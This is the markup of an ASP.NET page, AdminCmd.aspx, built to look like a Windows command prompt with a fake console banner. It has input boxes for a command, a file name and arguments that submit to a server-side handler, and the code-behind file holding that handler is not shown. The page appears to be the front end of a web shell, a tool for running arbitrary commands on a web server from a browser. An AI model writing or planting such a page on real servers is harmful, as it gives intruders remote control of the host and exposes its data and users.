<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="AdminCmd.aspx.cs" Inherits="AdminCMD.index" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <style>
        #Button1 {
        display:none;
        }
        #TextBox1 {
        width:100%;
        height:auto;
        border:none;
        }
        #textarea {
        width:100%;
        height:500px;
        }
        form > div {
        width:100%;
        height:100%;
        }
        form > div > div {
            width:100%;
            height:100%;
            border:1px solid #000000;
        }
    </style>
    <title></title>
</head>
<body onload="TextFocus()">
    <form id="form1" runat="server">
    <div>
        <asp:Button ID="Button2" runat="server" Text="Button" UseSubmitBehavior="False" OnClick="Button2_Click"/>
        <asp:TextBox ID="FileName" runat="server"></asp:TextBox>
        <asp:TextBox ID="Arguments" runat="server"></asp:TextBox>
        <div>
            <div id="textarea1" runat="server">
                Microsoft Windows [版本 6.3.9600]<br />
                (c) 2013 Microsoft Corporation。保留所有权利。<br />
            </div>
            <asp:TextBox ID="TextBox1" runat="server" onkeydown="keyDown"></asp:TextBox><br />
        </div>
        <asp:Button ID="Button1" runat="server" Text="Button" OnClick="Button1_Click"/>
    </div>
    </form>
<script type="text/javascript">
    function TextFocus() {
        var TextBox1 = document.getElementById("TextBox1");
        TextBox1.focus()
    }
    
    function keyDown()   
    {   
        var e=event.srcElement;   
        if(event.keyCode==13)   
        {   
            document.getElementById("Button1").click();   
        }   
    }   
</script>
</body>
</html>
